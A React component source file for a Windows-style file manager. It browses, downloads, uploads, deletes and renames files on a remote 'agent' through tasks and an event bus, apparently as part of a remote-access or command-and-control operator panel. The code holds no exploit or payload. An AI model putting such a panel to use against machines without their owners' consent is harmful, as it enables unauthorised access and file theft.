import React, { useState, useEffect } from 'react';
import {
    Folder, File, Download, Upload, Trash2, RefreshCw,
    FolderPlus, Edit2, Copy, ClipboardPaste, HardDrive,
    ChevronRight, ChevronDown, Monitor, Share2, Info
} from 'lucide-react';
import { listFiles, downloadFile, uploadFile, deleteFile, createFolder, renameFile } from '../../services/api';
import { kaalEvents } from '../../services/eventBus';

const FileManager = ({ agentId }) => {
    const [currentPath, setCurrentPath] = useState('C:\\');
    const [files, setFiles] = useState([]);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);
    const [selectedFiles, setSelectedFiles] = useState(new Set());
    const [sortConfig, setSortConfig] = useState({ key: 'name', direction: 'asc' });
    const [statusMessage, setStatusMessage] = useState('Ready');

    // FileVista tree state
    const [treeFolders, setTreeFolders] = useState([
        { name: "Root", path: "C:\\", isOpen: true, children: [] }
    ]);

    useEffect(() => {
        const unsubscribe = kaalEvents.on('task_result', (data) => {
            if (data.agent_id !== agentId) return;

            let parsed = null;
            try {
                if (typeof data.result === 'string' && (data.result.startsWith('{') || data.result.startsWith('['))) {
                    parsed = JSON.parse(data.result);
                } else if (typeof data.result === 'object') {
                    parsed = data.result;
                }
            } catch (e) { /* Not JSON */ }

            if (parsed && parsed.type === 'file_list') {
                if (parsed.files) {
                    setFiles(parsed.files);
                    if (parsed.path) {
                        setCurrentPath(parsed.path);
                        setTreeFolders(prev => updateTreeWithNodes(prev, parsed.path, parsed.files));
                    }
                } else if (parsed.items) {
                    setFiles(parsed.items);
                }
                setLoading(false);
                setSelectedFiles(new Set()); // clear selection on navigate
            }
            else if (parsed && parsed.type === 'error') {
                setError(parsed.data || "Unknown Error");
                setLoading(false);
            }
            else if (data.result && typeof data.result === 'string' && data.result.startsWith("[FILES]")) {
                try {
                    const legacyParsed = JSON.parse(data.result.substring(8));
                    if (legacyParsed.items) {
                        setFiles(legacyParsed.items);
                        if (legacyParsed.path) setCurrentPath(legacyParsed.path);
                    }
                    setLoading(false);
                    setSelectedFiles(new Set());
                } catch (e) {
                    setError("Failed to parse file list");
                    setLoading(false);
                }
            } else if (data.result && typeof data.result === 'string' && data.result.startsWith("Error")) {
                setError(data.result);
                setLoading(false);
            }

            // STATUS MESSAGE CAPTURE
            if (data.result && typeof data.result === 'string') {
                if (data.result.includes("Chunk") || data.result.includes("download") || data.result.includes("upload")) {
                    setStatusMessage(data.result);
                }
            } else if (parsed && parsed.type === 'text') {
                if (parsed.data.text && (parsed.data.text.includes("Chunk") || parsed.data.text.includes("download") || parsed.data.text.includes("upload") || parsed.data.text.includes("successfully"))) {
                    setStatusMessage(parsed.data.text);
                }
            }
        });

        loadFiles('C:\\');
        return () => unsubscribe();
    }, [agentId]);

    const loadFiles = async (path) => {
        setLoading(true);
        setError(null);
        try {
            await listFiles(agentId, path);
            setCurrentPath(path);
        } catch (err) {
            setError("Failed to request file list: " + err.message);
            setLoading(false);
        }
    };

    const handleNavigate = (dirName) => {
        let newPath = currentPath;
        if (!newPath.endsWith('\\') && !newPath.endsWith('/')) {
            newPath += '\\';
        }
        newPath += dirName;
        loadFiles(newPath);
    };

    const handleBreadcrumbNavigate = (index) => {
        const parts = currentPath.split(/[\\/]/).filter(Boolean);
        if (index === 0) {
            loadFiles(parts[0] + '\\');
            return;
        }
        const newPath = parts.slice(0, index + 1).join('\\');
        loadFiles(newPath);
    };

    const handleDownload = async () => {
        if (selectedFiles.size === 0) return;
        const filename = Array.from(selectedFiles)[0];
        try {
            let sep = currentPath.includes('\\') ? '\\' : '/';
            let formattedPath = currentPath.endsWith(sep) ? currentPath : currentPath + sep;
            const filepath = formattedPath + filename;
            await downloadFile(agentId, filepath);
            setStatusMessage(`Queued download for ${filename}...`);
        } catch (err) {
            setError("Download failed: " + err.message);
        }
    };

    const handleUpload = async (e) => {
        const file = e.target.files[0];
        if (!file) return;

        try {
            setLoading(true);
            await uploadFile(agentId, file, currentPath);
            loadFiles(currentPath);
        } catch (err) {
            setError("Upload failed: " + err.message);
        } finally {
            setLoading(false);
        }
    };

    const handleDelete = async () => {
        if (selectedFiles.size === 0) return;
        const filename = Array.from(selectedFiles)[0];
        if (!window.confirm(`Are you sure you want to delete ${filename}?`)) return;

        try {
            setLoading(true);
            let sep = currentPath.includes('\\') ? '\\' : '/';
            let formattedPath = currentPath.endsWith(sep) ? currentPath : currentPath + sep;
            await deleteFile(agentId, formattedPath + filename);
            setTimeout(() => loadFiles(currentPath), 1000);
        } catch (err) {
            setError("Delete failed: " + err.message);
            setLoading(false);
        }
    };

    const handleCreateFolder = async () => {
        const folderName = window.prompt("Enter new folder name:");
        if (!folderName) return;

        try {
            setLoading(true);
            let sep = currentPath.includes('\\') ? '\\' : '/';
            let formattedPath = currentPath.endsWith(sep) ? currentPath : currentPath + sep;
            await createFolder(agentId, formattedPath + folderName);
            setTimeout(() => loadFiles(currentPath), 1000);
        } catch (err) {
            setError("Create folder failed: " + err.message);
            setLoading(false);
        }
    };

    const handleRename = async () => {
        if (selectedFiles.size === 0) return;
        const oldName = Array.from(selectedFiles)[0];
        const newName = window.prompt(`Rename ${oldName} to:`, oldName);
        if (!newName || newName === oldName) return;

        try {
            setLoading(true);
            let sep = currentPath.includes('\\') ? '\\' : '/';
            let formattedPath = currentPath.endsWith(sep) ? currentPath : currentPath + sep;
            await renameFile(agentId, formattedPath + oldName, formattedPath + newName);
            setTimeout(() => loadFiles(currentPath), 1000);
        } catch (err) {
            setError("Rename failed: " + err.message);
            setLoading(false);
        }
    };

    const toggleSelection = (filename) => {
        const newSet = new Set(selectedFiles);
        if (newSet.has(filename)) newSet.delete(filename);
        else newSet.add(filename);
        setSelectedFiles(newSet);
    };

    const formatBytes = (bytes) => {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    };

    const handleSort = (key) => {
        let direction = 'asc';
        if (sortConfig.key === key && sortConfig.direction === 'asc') direction = 'desc';
        setSortConfig({ key, direction });
    };

    const sortedFiles = [...files].sort((a, b) => {
        if (a.is_dir && !b.is_dir) return -1;
        if (!a.is_dir && b.is_dir) return 1;

        if (a[sortConfig.key] < b[sortConfig.key]) return sortConfig.direction === 'asc' ? -1 : 1;
        if (a[sortConfig.key] > b[sortConfig.key]) return sortConfig.direction === 'asc' ? 1 : -1;
        return 0;
    });

    const updateTreeWithNodes = (currentTree, targetPath, loadedFiles) => {
        const newNodes = loadedFiles.filter(c => c.is_dir).map(c => ({
            name: c.name,
            path: targetPath + (targetPath.endsWith('\\') || targetPath.endsWith('/') ? '' : '\\') + c.name,
            isOpen: false,
            children: []
        }));

        const recurse = (nodes) => {
            return nodes.map(node => {
                const unifiedNodePath = node.path.replace(/\\/g, '/').replace(/\/$/, '');
                const unifiedTarget = targetPath.replace(/\\/g, '/').replace(/\/$/, '');

                if (unifiedNodePath === unifiedTarget) {
                    const mergedChildren = newNodes.map(newNode => {
                        const existing = node.children.find(ec => ec.name === newNode.name);
                        return existing ? existing : newNode;
                    });
                    return { ...node, children: mergedChildren, isOpen: true };
                }
                if (node.children && node.children.length > 0) {
                    const staysOpen = node.isOpen || unifiedTarget.startsWith(unifiedNodePath + '/');
                    return { ...node, children: recurse(node.children), isOpen: staysOpen };
                }
                return node;
            });
        };
        return recurse(currentTree);
    };

    const toggleTreeFolder = (targetPath) => {
        setTreeFolders(prev => {
            const recurse = (nodes) => nodes.map(node => {
                const unifiedNodePath = node.path.replace(/\\/g, '/');
                const unifiedTarget = targetPath.replace(/\\/g, '/');
                if (unifiedNodePath === unifiedTarget) {
                    return { ...node, isOpen: !node.isOpen };
                }
                if (node.children) {
                    return { ...node, children: recurse(node.children) };
                }
                return node;
            });
            return recurse(prev);
        });
    };

    const handleNavigateFromTree = (path) => {
        loadFiles(path);
    };

    const TreeNode = ({ node, level, activePath }) => {
        const isExpanded = node.isOpen;
        const unifiedActive = activePath.replace(/\\/g, '/').replace(/\/$/, '');
        const unifiedNode = node.path.replace(/\\/g, '/').replace(/\/$/, '');
        const isStrictActive = unifiedActive === unifiedNode;

        return (
            <div className="select-none">
                <div
                    className={`flex items-center py-1 pr-2 cursor-pointer rounded ${isStrictActive ? 'bg-[#cce8ff] font-medium' : 'hover:bg-[#e5f3ff]'}`}
                    style={{ paddingLeft: `${level * 14 + 4}px` }}
                    onClick={() => handleNavigateFromTree(node.path)}
                >
                    <div
                        onClick={(e) => {
                            e.stopPropagation();
                            if (node.children.length > 0) toggleTreeFolder(node.path);
                            else handleNavigateFromTree(node.path);
                        }}
                        className="w-5 h-5 flex items-center justify-center hover:bg-[#cce8ff] rounded mr-0.5"
                    >
                        {node.children && node.children.length > 0 ? (
                            isExpanded ? <ChevronDown className="w-3.5 h-3.5 text-gray-500" /> : <ChevronRight className="w-3.5 h-3.5 text-gray-500" />
                        ) : <span className="w-3.5 h-3.5" />}
                    </div>
                    {level === 0 ? <HardDrive className="w-4 h-4 mr-1.5 text-gray-600 shrink-0" /> : <Folder className="w-4 h-4 mr-1.5 text-[#f7c041] fill-current shrink-0" />}
                    <span className="truncate text-gray-700">{node.name}</span>
                </div>
                {isExpanded && node.children && (
                    <div>
                        {node.children.map((child, i) => (
                            <TreeNode key={i} node={child} level={level + 1} activePath={activePath} />
                        ))}
                    </div>
                )}
            </div>
        );
    };

    const selectedSize = Array.from(selectedFiles).reduce((total, fileName) => {
        const file = files.find(f => f.name === fileName);
        return total + (file && !file.is_dir ? file.size : 0);
    }, 0);

    const breadcrumbs = currentPath.split(/[\\/]/).filter(Boolean);

    return (
        <div className="bg-[#f0f0f0] text-[#333] border border-[#ccc] rounded shadow-md h-full flex flex-col font-sans overflow-hidden">
            <div className="bg-[#e3eaf3] border-b border-[#a9bad3] flex flex-col">
                <div className="flex px-2 pt-1 gap-1 border-b border-[#d0d9e8] mb-1">
                    <button className="px-3 py-1 bg-white border border-[#a9bad3] border-b-0 rounded-t text-sm font-semibold text-[#1e395b]">Home</button>
                    <button className="px-3 py-1 hover:bg-[#d8e3f0] border border-transparent border-b-0 rounded-t text-sm text-[#444]">Organize</button>
                    <button className="px-3 py-1 hover:bg-[#d8e3f0] border border-transparent border-b-0 rounded-t text-sm text-[#444]">Share</button>
                </div>
                <div className="flex items-center px-4 py-2 gap-6">
                    <div className="flex gap-2 items-center border-r border-[#c2d0e2] pr-4">
                        <label className="flex flex-col items-center cursor-pointer hover:bg-[#d0dfef] p-1 rounded transition-colors group">
                            <Upload className="w-6 h-6 text-[#2a5b8f] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">Upload</span>
                            <input type="file" className="hidden" onChange={handleUpload} />
                        </label>
                        <button
                            onClick={handleDownload}
                            disabled={selectedFiles.size === 0}
                            className={`flex flex-col items-center p-1 rounded transition-colors ${selectedFiles.size > 0 ? 'hover:bg-[#d0dfef] cursor-pointer group' : 'opacity-40 cursor-not-allowed'}`}
                        >
                            <Download className="w-6 h-6 text-[#2a5b8f] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">Download</span>
                        </button>
                    </div>
                    <div className="flex gap-2 items-center border-r border-[#c2d0e2] pr-4">
                        <button onClick={handleCreateFolder} className="flex flex-col items-center p-1 hover:bg-[#d0dfef] rounded transition-colors group">
                            <FolderPlus className="w-6 h-6 text-[#e8a42b] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">New Folder</span>
                        </button>
                        <button
                            onClick={handleDelete}
                            disabled={selectedFiles.size === 0}
                            className={`flex flex-col items-center p-1 rounded transition-colors ${selectedFiles.size > 0 ? 'hover:bg-[#d0dfef] cursor-pointer group' : 'opacity-40 cursor-not-allowed'}`}
                        >
                            <Trash2 className="w-6 h-6 text-[#d83b3b] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">Delete</span>
                        </button>
                        <button
                            onClick={handleRename}
                            disabled={selectedFiles.size === 0}
                            className={`flex flex-col items-center p-1 rounded transition-colors ${selectedFiles.size > 0 ? 'hover:bg-[#d0dfef] cursor-pointer group' : 'opacity-40 cursor-not-allowed'}`}
                        >
                            <Edit2 className="w-6 h-6 text-[#2a5b8f] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">Rename</span>
                        </button>
                    </div>
                    <div className="flex gap-2 items-center pr-4">
                        <button className="flex flex-col items-center p-1 hover:bg-[#d0dfef] rounded transition-colors group">
                            <Copy className="w-6 h-6 text-[#2a5b8f] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">Copy</span>
                        </button>
                        <button className="flex flex-col items-center p-1 hover:bg-[#d0dfef] rounded transition-colors group">
                            <ClipboardPaste className="w-6 h-6 text-[#2a5b8f] group-hover:scale-110 transition-transform" />
                            <span className="text-[11px] mt-1 font-medium text-[#444]">Paste</span>
                        </button>
                    </div>
                </div>
            </div>

            <div className="bg-white border-b border-[#ccc] px-3 py-1.5 flex items-center justify-between">
                <div className="flex items-center text-sm">
                    <Monitor className="w-4 h-4 text-gray-500 mr-2" />
                    <ChevronRight className="w-4 h-4 text-gray-400 mx-1" />
                    {breadcrumbs.map((part, idx) => (
                        <React.Fragment key={idx}>
                            <button
                                onClick={() => handleBreadcrumbNavigate(idx)}
                                className="hover:bg-[#e5f3ff] hover:outline outline-1 outline-[#cce8ff] px-1 rounded cursor-pointer"
                            >
                                {part}
                            </button>
                            {idx < breadcrumbs.length - 1 && <ChevronRight className="w-4 h-4 text-gray-400 mx-1" />}
                        </React.Fragment>
                    ))}
                </div>
                <button onClick={() => loadFiles(currentPath)} title="Refresh" className="p-1 hover:bg-[#e5f3ff] rounded">
                    <RefreshCw className={`w-4 h-4 text-[#2a5b8f] ${loading ? 'animate-spin' : ''}`} />
                </button>
            </div>

            <div className="flex-1 flex overflow-hidden bg-white">
                <div className="w-64 border-r border-[#ccc] bg-[#f9f9f9] overflow-y-auto">
                    <div className="p-2 text-sm">
                        {treeFolders.map((rootNode, i) => (
                            <TreeNode key={i} node={rootNode} level={0} activePath={currentPath} />
                        ))}
                    </div>
                </div>

                <div className="flex-1 overflow-auto relative bg-white">
                    {loading && (
                        <div className="absolute inset-0 bg-white/60 flex items-center justify-center z-10">
                            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#2a5b8f]"></div>
                        </div>
                    )}

                    {error ? (
                        <div className="p-6 text-red-600 flex flex-col items-center justify-center h-full">
                            <Info className="w-8 h-8 mb-2 text-red-500" />
                            {error}
                        </div>
                    ) : (
                        <table className="w-full text-sm select-none">
                            <thead className="bg-[#f0f0f0] text-left sticky top-0 z-10 border-b border-[#ccc] shadow-[0_1px_2px_rgba(0,0,0,0.05)]">
                                <tr>
                                    <th className="p-2 w-10 font-normal text-gray-600 border-r border-[#e0e0e0]"></th>
                                    <th onClick={() => handleSort('name')} className="p-2 font-normal text-gray-600 border-r border-[#e0e0e0] cursor-pointer hover:bg-[#e5e5e5]">Name {sortConfig.key === 'name' ? (sortConfig.direction === 'asc' ? '▲' : '▼') : ''}</th>
                                    <th onClick={() => handleSort('modified_date')} className="p-2 w-40 font-normal text-gray-600 border-r border-[#e0e0e0] cursor-pointer hover:bg-[#e5e5e5]">Modified Date {sortConfig.key === 'modified_date' ? (sortConfig.direction === 'asc' ? '▲' : '▼') : ''}</th>
                                    <th onClick={() => handleSort('size')} className="p-2 w-28 font-normal text-gray-600 border-r border-[#e0e0e0] cursor-pointer hover:bg-[#e5e5e5]">Size {sortConfig.key === 'size' ? (sortConfig.direction === 'asc' ? '▲' : '▼') : ''}</th>
                                    <th className="p-2 w-32 font-normal text-gray-600 border-r border-[#e0e0e0]">Type</th>
                                </tr>
                            </thead>
                            <tbody>
                                {sortedFiles.map((file, idx) => (
                                    <tr
                                        key={idx}
                                        onClick={() => toggleSelection(file.name)}
                                        onDoubleClick={() => file.is_dir ? handleNavigate(file.name) : undefined}
                                        className={`border-b border-transparent hover:bg-[#f2f7fd] cursor-pointer ${selectedFiles.has(file.name) ? 'bg-[#cce8ff] border-[#99d1ff] outline outline-1 outline-[#99d1ff] z-0 relative' : ''}`}
                                    >
                                        <td className="p-1.5 text-center">
                                            {file.is_dir
                                                ? <Folder className="w-5 h-5 mx-auto text-[#f7c041] fill-current" />
                                                : <File className="w-5 h-5 mx-auto text-[#79869a]" />
                                            }
                                        </td>
                                        <td className="p-1.5 text-[#222]">
                                            {file.name}
                                        </td>
                                        <td className="p-1.5 text-gray-600 text-left pl-2">
                                            {file.modified_date || ''}
                                        </td>
                                        <td className="p-1.5 text-gray-600 text-right pr-4">
                                            {file.is_dir ? '' : formatBytes(file.size)}
                                        </td>
                                        <td className="p-1.5 text-gray-600">
                                            {file.is_dir ? 'File folder' : 'File'}
                                        </td>
                                    </tr>
                                ))}
                                {files.length === 0 && !loading && (
                                    <tr><td colSpan="5" className="p-10 text-center text-gray-400 italic">This folder is empty</td></tr>
                                )}
                            </tbody>
                        </table>
                    )}
                </div>
            </div>

            <div className="bg-[#f0f0f0] border-t border-[#ccc] px-3 py-1 flex items-center justify-between text-xs text-[#555]">
                <div className="flex gap-4">
                    <span>{files.length} {files.length === 1 ? 'item' : 'items'}</span>
                    {selectedFiles.size > 0 && (
                        <>
                            <span className="border-l border-[#ccc] pl-4">{selectedFiles.size} item(s) selected</span>
                            <span className="border-l border-[#ccc] pl-4">{formatBytes(selectedSize)}</span>
                        </>
                    )}
                </div>
                <div className="flex items-center gap-2">
                    <span className="opacity-70 font-semibold text-[#1e395b]">{statusMessage}</span>
                </div>
            </div>
        </div>
    );
};

export default FileManager;
